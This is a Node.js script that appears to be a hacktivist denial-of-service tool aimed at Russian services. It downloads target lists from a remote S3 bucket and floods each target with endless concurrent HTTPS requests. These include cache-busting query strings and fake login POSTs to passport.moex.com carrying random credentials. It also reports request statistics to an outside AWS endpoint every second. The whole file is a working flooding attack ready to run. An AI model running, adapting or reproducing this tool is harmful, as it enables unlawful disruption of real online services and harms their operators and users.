#!/usr/bin/env node

const https = require('https');

const defaultTarget = 'fsvts';
const targetedService = process.env.TARGET || defaultTarget;
const emailDomains = [
    'mail.ru',
    'yandex.ru',
];
const moskalWords = [
    'танки',
    'оружие',
    'оборона',
    'структура',
    'граждани',
    'безопасность',
    'Международный договор',
    'противодействие коррупции',
    'служба',
    'паляниця',
    'нісенітниця',
];

const total = {};
const current = {
    error: 0
}

function rand(maxOrList) {
    if (Array.isArray(maxOrList)) {
        const list = maxOrList;
        const index = Math.floor(Math.random() * list.length - 1);

        return list[index];
    }

    return Math.floor(Math.random() * maxOrList);
}

const getDurationInMilliseconds = (start) => {
    const NS_PER_SEC = 1e9
    const NS_TO_MS = 1e6
    const diff = process.hrtime(start)

    return (diff[0] * NS_PER_SEC + diff[1]) / NS_TO_MS
}

var CONCURRENCY_LIMIT = 10
var queue = []

setInterval(() => {
    const data = {
        ...current
    }

    Object.keys(current).forEach(key => {
        if (!total[key]) {
            total[key] = 0;
        }

        total[key] += current[key];
        current[key] = 0;
    })

    const options = {
        hostname: 'vz8hut3dbj.execute-api.eu-central-1.amazonaws.com',
        path: '/dev',
        port: 443,
        method: 'POST'
    }

    const req = https.request(options, () => {
        console.log('SENT LOG RESULTS');
    })

    req.write(JSON.stringify(data));

    req.end()
}, 1000)

async function fetchWithTimeout(resource) {
    return new Promise((resolve) => {
        setTimeout(() => {
            const start = process.hrtime()

            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), 15000);
            const method = resource.method || 'GET';

            let body = undefined;
            let path = resource.noQuery
              ? resource.path
              : `${resource.path}?putin=huilo&biba=${Math.random()}`;

            if (method === 'POST') {
                body = new URLSearchParams();

                if (resource.formData) {
                    Object.entries(resource.formData)
                        .forEach(([key, template]) => {
                            body.append(key, template.replace('{moskalWord}', rand(moskalWords)));
                        })
                } else {
                    body.append('return_to', `https://passport.moex.com/?putin=huilo&biba=${Math.random()}`);
                    body.append('user[credentials]', `${Math.random()}@${rand(emailDomains)}`);
                    body.append('user[password]', `${Math.random()}`);
                    body.append('authenticity_token', `${Math.random()}/${Math.random}`);
                }

                path = resource.path;
            }

            const options = {
                hostname: resource.hostname,
                path,
                port: 443,
                method,
                signal: controller.signal,
                rejectUnauthorized: false,
                headers: resource.headers || {},
            }

            const result = {path: `${options.hostname}${options.path}`};

            const req = https.request(options, res => {
                result.statusCode = res.statusCode;
                result.cacheStatus = res.headers['x-cache-status'];
                clearTimeout(id);
                result.durationInMilliseconds = getDurationInMilliseconds(start)

                const field = `status_${res.statusCode}`;

                if (!current[field]) {
                    current[field] = 0;
                }

                current[field] += 1;

                resolve(result);
            })

            req.on('error', error => {
                result.error = error.message;
                clearTimeout(id);
                result.durationInMilliseconds = getDurationInMilliseconds(start)

                current.error += 1;
                resolve(result);
            })

            if (method === 'POST') {
                req.write(body.toString());
            }

            req.end();
        }, Math.random() * 1000)

    })
}

//
async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        queue.push(
            fetchWithTimeout(target)
                .then((response) => {
                    console.clear();
                    console.log(total)
                    console.log(response)
                })
        )
    }
}

(() => {
    const req = https.request({
        hostname: 'putin-huilo-targets.s3.eu-central-1.amazonaws.com',
        path: `/${targetedService}.targets.json`,
        port: 443,
        method: 'GET',
    }, (res) => {
        const body = [];
        res.on('data', function(chunk) {
            body.push(chunk);
        });

        res.on('end', function() {
            try {
                const targets = process.env.SOURCE === 'local'
                    ? require(`./${targetedService}.targets.json`)
                    : JSON.parse(Buffer.concat(body).toString());

                console.log('DOWNLOADED TARGETS');

                targets.forEach((target) => {
                    flood(target)
                })
            } catch(e) {
                console.error(e);
            }
        });
    });

    req.end();
})()
